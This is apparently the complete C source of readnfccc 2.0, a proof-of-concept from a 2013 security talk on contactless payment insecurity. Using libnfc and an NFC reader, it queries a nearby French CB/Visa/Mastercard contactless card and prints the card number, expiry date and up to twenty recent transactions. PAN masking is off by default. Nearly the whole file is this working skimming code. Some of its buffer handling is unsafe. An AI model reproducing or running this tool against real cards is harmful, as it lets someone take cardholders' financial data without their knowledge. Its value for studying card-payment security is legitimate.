/*

readnfccc 2.0 - by Renaud Lifchitz (renaud.lifchitz@oppida.fr)
License: distributed under GPL version 3 (http://www.gnu.org/licenses/gpl.html)

* Introduction:
"Quick and dirty" proof-of-concept
Open source tool developped and showed for 8dot8 2013 in Santiago, Chile - "Contacless payments insecurity"
SPANISH VERSION
Reads NFC credit card personal data (gender, first name, last name, PAN, expiration date, transaction history...)
Designed to works on French CB debit cards. Needs modifications to work for other cards.

* Requirements:
libnfc (>= 1.7.0-rc7) and a suitable NFC reader (http://nfc-tools.org/index.php?title=Devices_compatibility_matrix)

* Compilation:
$ gcc readnfccc.c -lnfc -o readnfccc

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <nfc/nfc.h>

// Choose whether to mask the PAN or not
#define MASKED 0 

#define MAX_FRAME_LEN 300

int cc = 0;
char card[25];
char month[2];
char year[2];

void show(size_t recvlg, uint8_t *recv)
{
  int i;
  int p;
  unsigned char t[3];
  int tl = 0;
  int vl = 0;

  printf("< ");
  for (i = 0; i < (int) recvlg; i++) {
    printf("%02x ", (unsigned int) recv[i]);
  }
  printf("\n");
}

void parseCard(uint8_t *buf, int len) {
	int n;
	uint8_t d;
	uint8_t *p = card;
	int c = 0;

	memset(card, 0, sizeof(card));
	//show(len, buf);
	for(n = 0; n < (len * 2); n++) {
		if (n & 1) {
			d = (buf[n >> 1]) & 0x0f;
		} else {
			d = (buf[n >> 1] >> 4) & 0x0f;
		}
		if (d == 0x0d) {
			c = 1;
		} else {
			if (c > 0) {
				if (c == 1)
					p = year;
				if (c == 3)
					p = month;
				if (c == 5)
					break;
				c++;	
			}
			*p++ = '0' + d;
		}
	}
	cc = 1;
}

void parseDate(uint8_t *buf) {
	year[0] = '0' + ((buf[0] >> 4) & 0x0f);
	year[1] = '0' + ((buf[0] >> 0) & 0x0f);
	month[0] = '0' + ((buf[1] >> 4) & 0x0f);
	month[1] = '0' + ((buf[1] >> 0) & 0x0f);
}

void dumpTLV(int level, uint8_t *buf, int len, int tlen) {
	int n = 0;
	int t = 0;
	int l = 0;
	int i;
	uint8_t *p = buf, *pp;
	uint8_t ascii[256], *pa;

	while(p < buf + len) {
		if (n == 0) {
			pp = p;
			for(i = 0; i < level; i++)
				printf("-} ");
			t = 0;
		} 
		if (n < tlen) {
			t = (t << 8) | *p;
			if (t == 0x9f || t == 0x5f) // Uglish
				tlen = 2;
			printf("%02x", *p);
			p++;
		} else if (n == tlen) {
			l = *p;
			if (l == 0x81) { // ISO7816 - 5.2.2.2 - BER-TLV length fields
				p++;
				l = *p;
				pp++;
			}
			printf(" L=%02x (%3d): ", *p, l);
			if (l == 0) {
				n = 0;
				printf("\n");
				break;
			}
			p++;
			pa = ascii;
		} else if (n <= tlen + l) {
			if (*p < 0x20 || *p > 0x7f) {
				*pa++ = '?';
			} else {
				*pa++ = *p;
			}
			printf("%02x ",*p);
			p++;
			if (n == tlen + l) {
				*pa = 0;
				printf("[%s]\n", ascii);
				n = -1;				

				if (t == 0x57 || t == 0x5a)
					parseCard(pp + 2, l);

				if (t == 0x5f24)
					parseDate(pp + 3); 

				if (t == 0x6f || t == 0xa5 || t == 0x70)
					dumpTLV(level + 1, pp + tlen + 1, l, 1);
			}
		}
		n++;
	}
	if (n != 0) {
		printf(" Parse error, n = %d\n", n);
	}
}

int main(int argc, char **argv)
{
  nfc_context *context;
  nfc_device *pnd;
  nfc_target nt;
  uint8_t abtRx[MAX_FRAME_LEN];
  uint8_t abtTx[MAX_FRAME_LEN];
  size_t szRx = sizeof(abtRx);
  size_t szTx;

  uint8_t SELECT_APP[] = {0x00, 0xA4, 0x04, 0x00, 0x07, 0xA0, 0x00, 0x00, 0x00, 0x42, 0x10, 0x10, 0x00};
  uint8_t READ_RECORD_VISA[] = {0x00, 0xB2, 0x02, 0x0C, 0x00, 0x00};
  uint8_t READ_RECORD_MC[] = {0x00, 0xB2, 0x01, 0x14, 0x00, 0x00};
  uint8_t READ_PAYLOG_VISA[] = {0x00, 0xB2, 0x01, 0x8C, 0x00, 0x00};
  uint8_t READ_PAYLOG_MC[] = {0x00, 0xB2, 0x01, 0x5C, 0x00, 0x00};

  unsigned char *res, output[50], c, amount[10], msg[100];
  unsigned int i, j, expiry;

  // uint8_t data[] = { 0x6f, 0x5e, 0x84, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x42, 0x10, 0x10, 0xa5, 0x53, 0x50, 0x0b, 0x43, 0x42, 0x20, 0x43, 0x4f, 0x4d, 0x50, 0x54, 0x41, 0x4e, 0x54, 0x87, 0x01, 0x01, 0x9f, 0x11, 0x01, 0x01, 0x9f, 0x12, 0x0b, 0x43, 0x42, 0x20, 0x43, 0x4f, 0x4d, 0x50, 0x54, 0x41, 0x4e, 0x54, 0x5f, 0x2d, 0x02, 0x66, 0x72, 0x9f, 0x38, 0x18, 0x9f, 0x66, 0x04, 0x9f, 0x02, 0x06, 0x9f, 0x03, 0x06, 0x9f, 0x1a, 0x02, 0x95, 0x05, 0x5f, 0x2a, 0x02, 0x9a, 0x03, 0x9c, 0x01, 0x9f, 0x37, 0x04, 0xbf, 0x0c, 0x0e, 0xdf, 0x60, 0x02, 0x11, 0x32, 0x9f, 0x4d, 0x02, 0x11, 0x32, 0xdf, 0x61, 0x01, 0x03, 0x90, 0x00 };

  nfc_init(&context);
  if (context == NULL) {
    printf("Unable to init libnfc (malloc)");
    exit(EXIT_FAILURE);
  }
  const char *acLibnfcVersion = nfc_version();
  printf("Using libnfc %s\n", acLibnfcVersion);
  pnd = nfc_open(context, NULL);
  if (pnd == NULL) {
    printf("Error opening NFC reader");
    nfc_exit(context);
    exit(EXIT_FAILURE);
  }

  if (nfc_initiator_init(pnd) < 0) {
    nfc_perror(pnd, "nfc_initiator_init");
    nfc_close(pnd);
    nfc_exit(context);
    exit(EXIT_FAILURE);
  };
  //printf("NFC reader: %s opened\n", nfc_device_get_name(pnd));

  int result;
  const nfc_modulation nm = {
    .nmt = NMT_ISO14443B,
    .nbr = NBR_106,
  };
  if (nfc_initiator_select_passive_target(pnd, nm, NULL, 0, &nt) <= 0) {
    nfc_perror(pnd, "START_14443A");
    return(1);
  }

  if ((result = nfc_initiator_transceive_bytes(pnd, SELECT_APP, sizeof(SELECT_APP), abtRx, sizeof(abtRx), 500)) < 0) {
    nfc_perror(pnd, "SELECT_APP");
    return(1);
  }
  printf("===========================\n");
  show(result, abtRx);
  printf("===========================\n");
  dumpTLV(0, abtRx, result, 1);

  if ((result = nfc_initiator_transceive_bytes(pnd, READ_RECORD_VISA, sizeof(READ_RECORD_VISA), abtRx, sizeof(abtRx), 500)) < 0) {
    nfc_perror(pnd, "READ_RECORD");
    return(1);
  }
  printf("===========================\n");
  show(result, abtRx);
  printf("===========================\n");
  dumpTLV(0, abtRx, result, 1);

  if ((result = nfc_initiator_transceive_bytes(pnd, READ_RECORD_MC, sizeof(READ_RECORD_MC), abtRx, sizeof(abtRx), 500)) < 0) {
    nfc_perror(pnd, "READ_RECORD");
    return(1);
  }
  printf("===========================\n");
  show(result, abtRx);
  printf("===========================\n");
  dumpTLV(0, abtRx, result, 1);

  printf("======================================================\n");
  printf("======================================================\n");
  printf("======================================================\n");

  for (i = 1; i <= 20; i++) {
    READ_PAYLOG_VISA[2] = i;
    if ((result = nfc_initiator_transceive_bytes(pnd, READ_PAYLOG_VISA, sizeof(READ_PAYLOG_VISA), abtRx, sizeof(abtRx), 500)) < 0) {
      nfc_perror(pnd, "READ_RECORD");
      return(1);
    }
    if (result == 17) { // Non-empty transaction
      //show(result, abtRx);
      res = abtRx;

      /* Look for date */
      sprintf(msg, "%02x/%02x/20%02x", res[13], res[12], res[11]);

      /* Look for transaction type */
      if (res[14] == 0) {
        sprintf(msg, "%s %s", msg, "Paiement");
      } else if (res[14] == 1) {
        sprintf(msg, "%s %s", msg, "Retrait");
      }

      /* Look for amount*/
      sprintf(amount, "%02x%02x%02x", res[2], res[3], res[4]);
      sprintf(msg, "%s\t%d,%02x€", msg, atoi(amount), res[5]);

      printf("%c %s\n", (res[6] ? 'A' : 'R'), msg);
    }
  }

  for (i = 1; i <= 20; i++) {
    READ_PAYLOG_MC[2] = i;
    if ((result = nfc_initiator_transceive_bytes(pnd, READ_PAYLOG_MC, sizeof(READ_PAYLOG_MC), abtRx, sizeof(abtRx), 500)) < 0) {
      nfc_perror(pnd, "READ_RECORD");
      return(1);
    }
    if (result == 17) { // Non-empty transaction
      //show(result, abtRx);
      res = abtRx;

      /* Look for date */
      sprintf(msg, "%02x/%02x/20%02x", res[13], res[12], res[11]);

      /* Look for transaction type */
      if (res[14] == 0) {
        sprintf(msg, "%s %s", msg, "Paiement");
      } else if (res[14] == 1) {
        sprintf(msg, "%s %s", msg, "Retrait");
      }

      /* Look for amount*/
      sprintf(amount, "%02x%02x%02x", res[2], res[3], res[4]);
      sprintf(msg, "%s\t%d,%02x€", msg, atoi(amount), res[5]);

      printf("%c %s\n", (res[6] ? 'A' : 'R'), msg);
    }
  }

  if (cc) {
	printf("======================================================\n");

#if MASKED
  	for(i = 6; i < strlen(card) - 4; i++)
		card[i] = 'X';
#endif
	printf("[%s] 20%c%c/%c%c\n", card, year[0], year[1], month[0], month[1]);
	printf("======================================================\n");
  }

  nfc_close(pnd);
  nfc_exit(context);

  return(0);
}


